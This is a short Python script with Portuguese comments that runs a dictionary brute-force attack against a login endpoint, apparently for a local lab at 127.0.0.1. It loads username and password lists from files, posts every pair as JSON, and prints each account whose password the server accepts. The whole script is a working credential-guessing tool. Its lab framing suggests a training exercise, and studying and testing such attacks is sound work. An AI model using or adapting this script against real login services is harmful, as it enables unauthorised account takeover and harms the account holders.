import requests

# ==============================================================================
# 1. PARÂMETROS DE EXECUÇÃO
# ==============================================================================
# Endpoint de autenticação do laboratório
url = "http://127.0.0.1:8002/login"

arquivo_usuarios = "usuarios.txt"
arquivo_senhas = "senhas.txt"

print("=" * 60)
print("   INICIANDO TESTE DE AUTENTICAÇÃO COM MÚLTIPLOS USUÁRIOS")
print("=" * 60)

# ==============================================================================
# 2. CARREGAMENTO DOS DADOS PARA A MEMÓRIA
# ==============================================================================
with open(arquivo_usuarios, "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open(arquivo_senhas, "r") as arq_s:
    senhas = arq_s.read().splitlines()

print(f"Total de usuários carregados : {len(usuarios)}")
print(f"Total de senhas carregadas   : {len(senhas)}")
print("=" * 60)

# ==============================================================================
# 3. EXECUÇÃO DOS LAÇOS ANINHADOS (USUÁRIO x SENHA)
# ==============================================================================
for usuario in usuarios:
    print(f"\n[+] Testando conta: {usuario}")
    senha_encontrada = False

    for senha in senhas:
        # Monta a estrutura da requisição
        dados = {
            "usuario": usuario,
            "senha": senha
        }

        # Dispara a requisição HTTP POST para a API
        resposta = requests.post(url, json=dados)

        print(f"    Tentativa com senha '{senha}' -> Status: {resposta.status_code}")

        # Avalia se a credencial foi aceita pelo servidor
        if resposta.status_code == 200:
            print(f"    >>> SUCESSO! A senha do usuário '{usuario}' é: '{senha}' <<<")
            senha_encontrada = True
            break  # Interrompe o laço de senhas e avança para o próximo usuário

    if not senha_encontrada:
        print(f"    [-] Nenhuma senha da lista foi válida para o usuário '{usuario}'.")

print("\n" + "=" * 60)
print("Processo concluído para todos os usuários da lista.")
print("=" * 60)
